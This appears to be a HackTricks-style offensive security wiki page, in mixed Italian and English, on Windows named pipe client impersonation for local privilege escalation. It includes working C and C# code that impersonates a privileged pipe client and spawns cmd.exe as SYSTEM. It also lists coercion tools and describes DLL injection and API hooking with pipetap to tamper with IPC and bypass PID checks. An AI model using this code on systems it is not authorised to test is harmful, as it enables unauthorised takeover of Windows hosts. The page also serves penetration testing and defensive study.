# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation è un primitivo di local privilege escalation che permette a un thread server di named-pipe di adottare il contesto di sicurezza di un client che si connette. In pratica, un attacker che può eseguire codice con SeImpersonatePrivilege può costringere un client privilegiato (es., un servizio SYSTEM) a connettersi a una pipe controllata dall'attaccante, chiamare ImpersonateNamedPipeClient, duplicare il token risultante in un token primario e avviare un processo come il client (spesso NT AUTHORITY\SYSTEM).

Questa pagina si concentra sulla tecnica di base. Per catene di exploit end-to-end che costringono SYSTEM a connettersi alla tua pipe, vedi le pagine della famiglia Potato referenziate sotto.

## TL;DR
- Create a named pipe: \\.\pipe\<random> and wait for a connection.
- Make a privileged component connect to it (spooler/DCOM/EFSRPC/etc.).
- Read at least one message from the pipe, then call ImpersonateNamedPipeClient.
- Open the impersonation token from the current thread, DuplicateTokenEx(TokenPrimary), and CreateProcessWithTokenW/CreateProcessAsUser to get a SYSTEM process.

## Requisiti e API chiave
- Privileges typically needed by the calling process/thread:
- SeImpersonatePrivilege to successfully impersonate a connecting client and to use CreateProcessWithTokenW.
- Alternatively, after impersonating SYSTEM, you can use CreateProcessAsUser, which may require SeAssignPrimaryTokenPrivilege and SeIncreaseQuotaPrivilege (these are satisfied when you’re impersonating SYSTEM).
- Core APIs used:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (must read at least one message before impersonation)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: to perform useful actions locally, the client must allow SecurityImpersonation (default for many local RPC/named-pipe clients). Clients can lower this with SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION when opening the pipe.

## Flusso di lavoro Win32 minimo (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Note:
- Se ImpersonateNamedPipeClient restituisce ERROR_CANNOT_IMPERSONATE (1368), assicurati di leggere dalla pipe prima e che il client non abbia ristretto l'impersonation al livello Identification.
- Preferisci DuplicateTokenEx con SecurityImpersonation e TokenPrimary per creare un token primario adatto alla creazione di processi.

## .NET esempio rapido
In .NET, NamedPipeServerStream può effettuare impersonation tramite RunAsClient. Una volta in impersonation, duplica il thread token e crea un processo.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
Queste tecniche costringono servizi privilegiati a connettersi alla tua named pipe così puoi impersonarli:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (DLL Injection, API Hooking, PID Validation Bypass)

I servizi hardened per named-pipe possono comunque essere dirottati strumentando il client attendibile. Strumenti come [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) inseriscono una helper DLL nel client, fungono da proxy per il suo traffico e ti permettono di manomettere l'IPC privilegiato prima che il servizio SYSTEM lo consumi.

### Inline API hooking inside trusted processes
- Inietta la helper DLL (OpenProcess → CreateRemoteThread → LoadLibrary) in qualsiasi client.
- La DLL usa Detours per `ReadFile`, `WriteFile`, ecc., ma solo quando `GetFileType` segnala `FILE_TYPE_PIPE`; copia ogni buffer/metadata in una control pipe, ti consente di modificarlo/scartarlo/riprodurlo, quindi riprende l'API originale.
- Trasforma il client legittimo in un proxy in stile Burp: mettere in pausa payload UTF-8/UTF-16/raw, innescare percorsi di errore, riprodurre sequenze o esportare tracce JSON.

### Remote client mode to defeat PID-based validation
- Inietta in un client allow-listed, poi nella GUI scegli la pipe e quel PID.
- La DLL esegue `CreateFile`/`ConnectNamedPipe` dentro il processo trusted e inoltra l'I/O a te, così il server continua a vedere il PID/image legittimo.
- Bypassa i filtri che si affidano a `GetNamedPipeClientProcessId` o a controlli di signed-image.

### Fast enumeration and fuzzing
- `pipelist` enumera `\\.\pipe\*`, mostra ACLs/SIDs e inoltra le voci ad altri moduli per probe immediate.
- Il client di pipe/compositore di messaggi si connette a qualsiasi nome e costruisce payload UTF-8/UTF-16/raw-hex; importa blob catturati, muta campi e rinvia per cercare deserializzatori o comandi non autenticati.
- La helper DLL può ospitare un listener TCP loopback in modo che tooling/fuzzer possano pilotare la pipe da remoto tramite lo Python SDK.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
Combina il TCP bridge con i ripristini di snapshot della VM per crash-testare parser IPC fragili.

### Considerazioni operative
- Named pipes sono a bassa latenza; pause prolungate durante la modifica dei buffer possono bloccare servizi fragili.
- Overlapped/completion-port I/O coverage è parziale, quindi aspettati casi limite.
- Injection è noisy e unsigned, quindi trattala come un lab/exploit-dev helper piuttosto che come uno stealth implant.

## Risoluzione dei problemi e insidie
- Devi leggere almeno un messaggio dalla pipe prima di chiamare ImpersonateNamedPipeClient; altrimenti otterrai ERROR_CANNOT_IMPERSONATE (1368).
- Se il client si connette con SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, il server non può impersonare completamente; verifica il livello di impersonation del token tramite GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW richiede SeImpersonatePrivilege sul chiamante. Se fallisce con ERROR_PRIVILEGE_NOT_HELD (1314), usa CreateProcessAsUser dopo aver già impersonato SYSTEM.
- Assicurati che il security descriptor della pipe consenta al servizio target di connettersi se lo rinforzi; per default, le pipe sotto \\.\pipe sono accessibili secondo la DACL del server.

## Riferimenti
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)

{{#include ../../banners/hacktricks-training.md}}
